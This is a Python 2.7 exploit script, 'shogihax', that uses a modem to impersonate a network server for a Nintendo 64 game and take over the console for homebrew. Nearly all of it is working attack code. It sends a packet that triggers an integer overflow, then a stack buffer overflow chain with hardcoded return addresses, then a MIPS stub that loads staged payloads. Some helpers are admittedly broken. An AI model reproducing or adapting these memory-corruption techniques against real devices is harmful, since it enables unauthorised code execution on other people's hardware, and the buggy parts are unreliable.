#!/usr/bin/env python2.7

import os, signal
import sys
import time
import serial
import random
import string
import struct
import array
import subprocess
import platform
import logging
import logging.handlers
from datetime import datetime, timedelta

logger = logging.getLogger('shogihax')


def getStage2():
	bufz = ''

	with open(sys.argv[2], 'rb') as f:
		bufz += f.read()

	return bufz

def getStage3():
	bufz = ''

	with open(sys.argv[3], 'rb') as f:
		bufz += f.read()

	return bufz

# Not working... I don't speak Python
def make_jump(address):
	# la $v0, address
	# jalr $v0
	# nop
	return '\x3c\x02' + bytes([(address & 0xff000000) >> 24, (address & 0x00ff0000) >> 16]) + '\x34\x42' + bytes([(address & 0x0000ff00) >> 8, address & 0x000000ff]) + '\x00\x40\xf8\x09\x00\x00\x00\x00'

class Modem(object):
	def __init__(self, device, speed):
		self._device = device
		self._speed  = speed
		self._serial = None

		self._time_since_last_dial_tone = None
		self._dial_tone_counter = 0

	@property
	def device_name(self):
		return self._device

	@property
	def device_speed(self):
		return self._speed

	@property
	def dial_tone(self):
		_dial_tone = None

		with open(os.getcwd() + '/dt.wav', "rb") as f:
			_dial_tone = f.read()
			_dial_tone = _dial_tone[44:]
		return _dial_tone

	def connect(self):
		if self._serial:
			disconnect()
		logger.info("Opening serial interface to {0}".format(self._device))
		self._serial = serial.Serial("{0}".format(self._device, self._speed))

	def disconnect(self):
		if self._serial and self._serial.isOpen():
			self._serial.close()
			self._serial = None
			logger.info("Serial interface terminated")

	def reset(self):
		self.cmd("ATZ0")
		time.sleep(1.0)
		self.cmd("ATE0")
		time.sleep(1.0)

	def escp(self):
		time.sleep(1.0)
		self._serial.write("+++")
		time.sleep(1.0)

	def start_vm(self):
		self.reset()
		self.cmd("AT+FCLASS=8")
		self.cmd("AT+VLS=1")
		self.cmd("AT+VSM=1,8000")
		self.cmd("AT+VTX")

		self._sending_tone = True

		self._time_since_last_dial_tone = (datetime.now() - timedelta(seconds=100))

		self._dial_tone_counter = 0

	def stop_vm(self):
		self._serial.write("\0{}{}\r\n".format(chr(0x10), chr(0x03)))
		self.escp()
		self.cmd("ATH0")
		self.reset()
		self._sending_tone = False

	def update(self):
		now = datetime.now()
		if self._sending_tone:
			BUFFER_LENGTH = 1000
			TIME_BETWEEN_UPLOADS_MS = (1000.0 / 8000.0) * BUFFER_LENGTH

			milliseconds = (now - self._time_since_last_dial_tone).microseconds * 1000
			if not self._time_since_last_dial_tone or milliseconds >= TIME_BETWEEN_UPLOADS_MS:
				byte = self.dial_tone[self._dial_tone_counter:self._dial_tone_counter+BUFFER_LENGTH]
				self._dial_tone_counter += BUFFER_LENGTH
				if self._dial_tone_counter >= len(self.dial_tone):
					self._dial_tone_counter = 0
				self._serial.write(byte)
				self._time_since_last_dial_tone = now

	def answer(self):
		self.reset()

		self.cmd("ATA", ignore_responses=["OK"])
		time.sleep(2)

		logger.info("Call answered")

	def login(self):
		print('Sending login')

		self.shax('\x2a')

		time.sleep(1)

		self.shax('\x43\x20\x4e\x53\x4e\x0d')

		self.shax('\x43\x4f\x4d\x0d')

		self.shax('\x45\x6e\x74\x65\x72\x20\x54\x79\x70\x65\x2d\x3e')

		time.sleep(1)

		self.shax('\x41\x4e\x36\x34\x30\x30\x31\x0d')

		time.sleep(1)
		
		self.seq = 0
	
	# Resets on updating packet handling callback (800bb49c)
	def reset_seq(self):
		self.seq = 0
	
	def pkt(self, cmd, payload):
		if len(payload) <= 80:
			self.pkt_verbose(0, cmd, 0, len(payload), payload)
			return
		
		self.pkt_verbose(5, cmd, 0, 80, payload)

		i = 80		
		while i < len(payload) - 80:		
			self.pkt_verbose(4, cmd, i, 80, payload)
			i += 80

		self.pkt_verbose(6, cmd, i, len(payload) - i, payload)

	def pkt_unterminated(self, cmd, payload):
		if len(payload) <= 80:
			self.pkt_verbose(0, cmd, 0, len(payload), payload)
			return
		
		self.pkt_verbose(5, cmd, 0, 80, payload)

		i = 80		
		while i < len(payload) - 80:		
			self.pkt_verbose(4, cmd, i, 80, payload)
			i += 80

		self.pkt_verbose(4, cmd, i, len(payload) - i, payload)

	def pkt_verbose(self, flags, cmd, offset, leng, payload):

		cmd_pkt = []

		# Pre-calculated CRC table
		CRCtable = [0x0000,0x1189,0x2312,0x329b,0x4624,0x57ad,0x6536,0x74bf,0x8c48,0x9dc1,
		  	    0xaf5a,0xbed3,0xca6c,0xdbe5,0xe97e,0xf8f7,0x1081,0x0108,0x3393,0x221a,
			    0x56a5,0x472c,0x75b7,0x643e,0x9cc9,0x8d40,0xbfdb,0xae52,0xdaed,0xcb64,
			    0xf9ff,0xe876,0x2102,0x308b,0x0210,0x1399,0x6726,0x76af,0x4434,0x55bd,
			    0xad4a,0xbcc3,0x8e58,0x9fd1,0xeb6e,0xfae7,0xc87c,0xd9f5,0x3183,0x200a,
	    		    0x1291,0x0318,0x77a7,0x662e,0x54b5,0x453c,0xbdcb,0xac42,0x9ed9,0x8f50,
	    		    0xfbef,0xea66,0xd8fd,0xc974,0x4204,0x538d,0x6116,0x709f,0x0420,0x15a9,
	    		    0x2732,0x36bb,0xce4c,0xdfc5,0xed5e,0xfcd7,0x8868,0x99e1,0xab7a,0xbaf3,
	    		    0x5285,0x430c,0x7197,0x601e,0x14a1,0x0528,0x37b3,0x263a,0xdecd,0xcf44,
	    		    0xfddf,0xec56,0x98e9,0x8960,0xbbfb,0xaa72,0x6306,0x728f,0x4014,0x519d,
	    		    0x2522,0x34ab,0x0630,0x17b9,0xef4e,0xfec7,0xcc5c,0xddd5,0xa96a,0xb8e3,
	    		    0x8a78,0x9bf1,0x7387,0x620e,0x5095,0x411c,0x35a3,0x242a,0x16b1,0x0738,
	    		    0xffcf,0xee46,0xdcdd,0xcd54,0xb9eb,0xa862,0x9af9,0x8b70,0x8408,0x9581,
	    		    0xa71a,0xb693,0xc22c,0xd3a5,0xe13e,0xf0b7,0x0840,0x19c9,0x2b52,0x3adb,
	    		    0x4e64,0x5fed,0x6d76,0x7cff,0x9489,0x8500,0xb79b,0xa612,0xd2ad,0xc324,
	    		    0xf1bf,0xe036,0x18c1,0x0948,0x3bd3,0x2a5a,0x5ee5,0x4f6c,0x7df7,0x6c7e,
	    		    0xa50a,0xb483,0x8618,0x9791,0xe32e,0xf2a7,0xc03c,0xd1b5,0x2942,0x38cb,
	    		    0x0a50,0x1bd9,0x6f66,0x7eef,0x4c74,0x5dfd,0xb58b,0xa402,0x9699,0x8710,
	    		    0xf3af,0xe226,0xd0bd,0xc134,0x39c3,0x284a,0x1ad1,0x0b58,0x7fe7,0x6e6e,
	    		    0x5cf5,0x4d7c,0xc60c,0xd785,0xe51e,0xf497,0x8028,0x91a1,0xa33a,0xb2b3,
	    		    0x4a44,0x5bcd,0x6956,0x78df,0x0c60,0x1de9,0x2f72,0x3efb,0xd68d,0xc704,
	    		    0xf59f,0xe416,0x90a9,0x8120,0xb3bb,0xa232,0x5ac5,0x4b4c,0x79d7,0x685e,
	    		    0x1ce1,0x0d68,0x3ff3,0x2e7a,0xe70e,0xf687,0xc41c,0xd595,0xa12a,0xb0a3,
	    		    0x8238,0x93b1,0x6b46,0x7acf,0x4854,0x59dd,0x2d62,0x3ceb,0x0e70,0x1ff9,
	    		    0xf78f,0xe606,0xd49d,0xc514,0xb1ab,0xa022,0x92b9,0x8330,0x7bc7,0x6a4e,
	    		    0x58d5,0x495c,0x3de3,0x2c6a,0x1ef1,0x0f78]

		# Packet type:
		enu_type = ['UNDEF0', 'UNDEF1', 'NS_ACK', 'NS_RETRY',
			    'NS_ABORT', 'NS_CONNECT', 'NS_DISCON', 'NS_COMMAND',
			    'NS_LOGINOK', 'UNDEF9', 'NS_LOGINFAIL', 'UNDEF11']

		pkt_type = list(enumerate(enu_type))

		apn_flag = 0

		for i in range(0, len(enu_type)):
			if(cmd == pkt_type[i][1]):
				cmd_pkt.append(pkt_type[i][0])
				apn_flag = 1

		if(apn_flag == 0):
			cmd_pkt.append(cmd)

		# ACK_flag = flag - & 0x80
		cmd_pkt.append(flags)

		# 2 byte sequence number
		cmd_pkt.append((self.seq >> 8) & 0xff)
		cmd_pkt.append((self.seq) & 0xff)
		#print("using seq ", self.seq)
		self.seq = self.seq + 1		

		cmd_pkt.append(0)
		cmd_pkt.append(0)

		# Payload Length
		payload_len = leng
		len_ary = array.array('B', struct.pack('<H', payload_len))
		cmd_pkt.append(len_ary[1])
		cmd_pkt.append(len_ary[0])

		# CRC
		cmd_pkt.append(0x00)
		cmd_pkt.append(0x00)

		# Payload
		for i in range(offset, offset + payload_len):
			cmd_pkt.append(int(ord(payload[i])))

		# CRC revisited
		uVar1 = 0xFFFF

		for i in range(0, len(cmd_pkt)):
			uVar1 = (CRCtable[cmd_pkt[i] ^ uVar1 & 0xFF]) ^ (uVar1 >> 8)

		pkt_chksum = ~uVar1 & 0xFFFF

		crc_ary = array.array('B', struct.pack('<H', pkt_chksum))
		cmd_pkt[8] = crc_ary[1]
		cmd_pkt[9] = crc_ary[0]

		headz = ""
		payloadz = ""

		for i in range(0, 10):
			headz += chr(cmd_pkt[i])

		self._serial.write(b'{0}'.format(headz))

		time.sleep(0.2)

		for i in range(10, 10 + payload_len):
			payloadz += chr(cmd_pkt[i])
		
		self._serial.write(b'{0}'.format(payloadz))
		
		print('Sent {0} packet to N64'.format(cmd))		
		
		time.sleep(0.2)

		return cmd_pkt
	
	def subcommand(self, command, command_code, subcommand, data):
		d = ''
		
		# MN, LS, ME, ED, IF, GS, GM, ML, BB, DL, FC, DC
		d += ((command[0]))
		d += ((command[1]))

 		d += str(unichr(0)) # objectID
		d += str(unichr(0)) # objectID

		d += str(unichr(0x41))
		d += str(unichr(0x42))
		
		d += str(unichr(0)) # parentID
		d += str(unichr(0)) # parentID
		
		d += str(unichr(0x43))
		d += str(unichr(0x44))
		d += str(unichr(0x45))
		d += str(unichr(0x46))
				

		d += str(unichr((command_code >> 8) & 0xff))
		d += str(unichr(command_code & 0xff))
		
		#d += str(unichr((subcommand >> 24) & 0xff))
		#d += str(unichr((subcommand >> 16) & 0xff))
		#d += str(unichr((subcommand >> 8) & 0xff))
		#d += str(unichr(subcommand & 0xff))
		d += subcommand

		d += data
				
		modem.pkt('NS_COMMAND', d)

	def subcommand_unterminated(self, command, command_code, subcommand, data):
		d = ''
		
		# MN, LS, ME, ED, IF, GS, GM, ML, BB, DL, FC, DC
		d += ((command[0]))
		d += ((command[1]))

 		d += str(unichr(0)) # objectID
		d += str(unichr(0)) # objectID

		d += str(unichr(0x41))
		d += str(unichr(0x42))
		
		d += str(unichr(0)) # parentID
		d += str(unichr(0)) # parentID
		
		d += str(unichr(0x43))
		d += str(unichr(0x44))
		d += str(unichr(0x45))
		d += str(unichr(0x46))
				

		d += str(unichr((command_code >> 8) & 0xff))
		d += str(unichr(command_code & 0xff))
		
		#d += str(unichr((subcommand >> 24) & 0xff))
		#d += str(unichr((subcommand >> 16) & 0xff))
		#d += str(unichr((subcommand >> 8) & 0xff))
		#d += str(unichr(subcommand & 0xff))
		d += subcommand

		d += data
				
		modem.pkt_unterminated('NS_COMMAND', d)

		return len(d)


	def shax(self, odata):
		idata = ""

		if(odata != ''):
			print('Sent to N64: {0}'.format(odata))
			self._serial.write(b'{0}'.format(odata))
			time.sleep(0.1)

	def shax_multiple(self, odata, n):
		idata = ""

		if(odata != ''):
			print('Sent to N64 x: {0}'.format(odata))
			for i in range(n):
				self._serial.write(b'{0}'.format(odata))
				time.sleep(0.1)
	
	def rec(self):
		while(self._serial.in_waiting):
			idata = self._serial.read(self._serial.in_waiting)
			print('Recv from N64: {0} ({1})'.format(idata, ":".join("{:02x}".format(ord(c)) for c in idata)))
			time.sleep(0.1)

	def rec_once(self):
		if(self._serial.in_waiting):
			idata = self._serial.read(self._serial.in_waiting)
			print('Recv from N64: {0} ({1})'.format(idata, ":".join("{:02x}".format(ord(c)) for c in idata)))

	#def rec_fast(self):
	#	idata = ''		
	#	while(self._serial.in_waiting):
	#		idata = idata + self._serial.read(self._serial.in_waiting)

	
	def cmd(self, command, timeout=60, ignore_responses=None):
		ignore_responses = ignore_responses or []

		VALID_RESPONSES = ["OK", "ERROR", "CONNECT", "VCON"]

		for ignore in ignore_responses:
			VALID_RESPONSES.remove(ignore)

		final_command = "%s\r\n" % command
		self._serial.write(final_command)
		logger.info(final_command)

		start = datetime.now()

		line = ""
		while True:
			new_data = self._serial.readline().strip()
			if not new_data:
				continue

			line = line + new_data
			for resp in VALID_RESPONSES:
				if resp in line:
					logger.info(line[line.find(resp):])
					return

			if (datetime.now() - start).total_seconds() > timeout:
				raise IOError("There was a timeout while waiting for a response from the modem")

if __name__ == '__main__':

	logging.basicConfig(level=logging.INFO)

	if(len(sys.argv) != 4):
		print('Wrong Usage: {0} MODEM_DEVICE_PATH stage2 stage3'.format(sys.argv[0]))
		exit()

	modem = Modem(sys.argv[1], 57600)

	mode = "LISTENING"

	modem.connect()
	modem.start_vm()

	time_digit_heard = None

	while True:
		now = datetime.now()

		if mode == "LISTENING":
			modem.update()

			char = modem._serial.read(1).strip()

			if not char:
				continue

			if ord(char) == 16:
				try:
					char = modem._serial.read(1)
					digit = int(char)
					logger.info("DTMF: %s", digit)
					mode = "ANSWERING"

					modem.stop_vm()

					time_digit_heard = now

				except(TypeError, ValueError):
					pass

		elif mode == "ANSWERING":
			if(now - time_digit_heard).total_seconds() > 8.0:
				time_digit_heard = None

				modem.answer()

				mode = "CONNECTED"

				time.sleep(1)

				modem.login()

				time.sleep(1)

		elif mode == "CONNECTED":
			modem.pkt('NS_CONNECT', '\xb5\x00\xb5\x0aAAAAAAAAAA\x00') # 0xB500 * 0xB50a * 2 = 0x100002400, integer overflow on heap allocation size
			
			modem.rec()
			
			modem.pkt('NS_LOGINOK', '')
			modem.rec()


			disableNetworking = 0x8001da9c # turns off the cartridge LED - easy way to test whether you're executing...
			
			
			# Upload stage 1 (0x800a747c: non-contiguous), just a jump to stage 2
			
			#stage2a = disableNetworking
			stage2a = 0xa01bd91c

			#modem.pkt('NS_COMMAND', '\x3c\x02' + '\x80\x01' + '\x34\x42' + '\xda\x9c' + '\x00\x40\xf8\x09\x00\x00\x00\x00')
			
			#modem.pkt('NS_COMMAND', '\x3c\x02' + '\xa0\x1b' + '\x34\x42' + '\xd9\x1c' + '\x00\x40\xf8\x09\x00\x00\x00\x00')
			#modem.pkt('NS_COMMAND', '\x3c\x02' + '\x80\x1b' + '\x34\x42' + '\xd9\x1c' + '\x00\x40\xf8\x09\x00\x00\x00\x00')
			#modem.pkt('NS_COMMAND', make_jump(stage2a))



			# Stage 2 executes from 0xa01bd91c
			
			# disableNetworking()
			#stage2 = '\x3c\x02' + '\x80\x01' + '\x34\x42' + '\xda\x9c' + '\x00\x40\xf8\x09\x00\x00\x00\x00'
			#stage2 = make_jump(0x8001da9c)

			# Mess up the screen
			stage2 = getStage2()

			if len(stage2) > 460:
				print 'Stage2 is too large for this setup (can be adjusted)'
				exit(0)

			
			# Pad stage 2 to consistent size so that we don't need to keep adjusting addresses
			# 540 aligns perfectly so that next data is start of new packet (and can be 80 bytes of contig data) for stage 1
			stage2 = stage2.ljust(460, '\x00')


			# Stage 1 at end of stage 2 packet
			#stage2 = stage2 + 'STAGE1: ' + '\x3c\x02' + '\xa0\x1b' + '\x34\x42' + '\xd9\x1c' + '\x00\x40\xf8\x09\x00\x00\x00\x00'
			stage2 = stage2 + 'STAGE1: ' + '\x3c\x02\x80\x1b\x27\xbd\xff\xd8\x34\x42\xd9\x1c\x24\x43\x10\x00\xff\xbf\x00\x20\xbc\x55\x00\x00\xbc\x50\x00\x00\x24\x42\x00\x04\x14\x43\xff\xfc\x00\x00\x00\x00\x24\x42\xf0\x00\x00\x40\xf8\x09\x00\x00\x00\x00'

			# Upload stack buffer overflow chain + stage 2
			l = modem.subcommand_unterminated('IF', 0x000e, '\x00\x00\x00\x09', 'd' * 108 + '\x80\x24\x64\x9a' + 'C' * (0x24 - 1) + '\xa0\x0a\x75\x4c' + '\x00' + 'B' + '\x00' + stage2)



			# Let the cache settle
			time.sleep(1)

			modem.rec()

			#raw_input("Press Enter to continue...")


			print 'Trigger'

			# Send last packet to trigger
			modem.pkt_verbose(6, 'NS_COMMAND', l, 1, 'I' * l + '\x00')



			#time.sleep(1)


			print 'Starting stage 3 transfer'
			
			
			stage3 = getStage3()
			stage3len = len(stage3)

			
			modem.shax(chr((stage3len & 0xff000000) >> 24) + chr((stage3len & 0x00ff0000) >> 16) + chr((stage3len & 0x0000ff00) >> 8) + chr(stage3len & 0x000000ff))

			# Wait for ack
			#ack = 0
			#while ack < 4:
			#	ack += len(modem._serial.read(modem._serial.in_waiting))

			print 'Got ack for length'

			i = 0
			tosend = 0
			while i < stage3len:
				# Wait for ack
				ack = 0
				while ack < (tosend / 256):
					ack += len(modem._serial.read(modem._serial.in_waiting))
				
				tosend = min(stage3len - i, 0x100)
				modem._serial.write(stage3[i : i + tosend])
				i += tosend
				
				print 100 * i / stage3len

				# Don't bother to ack final transfer because stage 3 will be executing by then, so it might not go through



			print 'Stage 3 transfer complete'
			
			#while(1):
			#	modem.shax('\x41')
			#	modem.rec_once()



			# Homebrew channel

			# Wait for ack that homebrew channel is running
			#while modem._serial.read(modem._serial.in_waiting) != 'H':
			#	print 'Waiting for Homebrew Channel to start'
			time.sleep(1)

			# Code is unstable so just send everything repeatedly to get it through

			# Number of programs (first char sent seems to be less reliable so send an extra time)
			modem.shax_multiple('\x03', 3)

			modem.shax_multiple('O', 2)
			modem.shax_multiple('N', 2)
			modem.shax_multiple('E', 2)
			modem.shax_multiple('\x00', 2)

			modem.shax_multiple('T', 2)
			modem.shax_multiple('W', 2)
			modem.shax_multiple('O', 2)
			modem.shax_multiple('\x00', 2)

			modem.shax_multiple('T', 2)
			modem.shax_multiple('H', 2)
			modem.shax_multiple('R', 2)
			modem.shax_multiple('E', 2)
			modem.shax_multiple('E', 2)
			modem.shax_multiple('\x00', 2)
			
			while(1):
				#modem.shax('\x41')
				modem.rec_once()
